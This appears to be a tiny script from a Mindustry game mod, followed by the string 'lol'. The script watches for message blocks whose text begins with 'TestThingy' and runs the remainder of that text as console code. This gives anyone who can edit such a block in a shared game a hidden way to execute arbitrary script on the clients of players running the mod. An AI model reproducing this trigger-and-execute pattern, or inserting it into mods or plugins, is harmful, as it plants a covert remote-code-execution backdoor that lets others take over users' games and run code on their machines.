Events.on(EventType.ClientLoadEvent,e=>{
Events.on(EventType.ConfigEvent,e=>{if(e.tile.block == Blocks.message){if(e.value.startsWith("TestThingy")){Vars.mods.scripts.runConsole(e.value.slice(11))}}});
});

"lol";
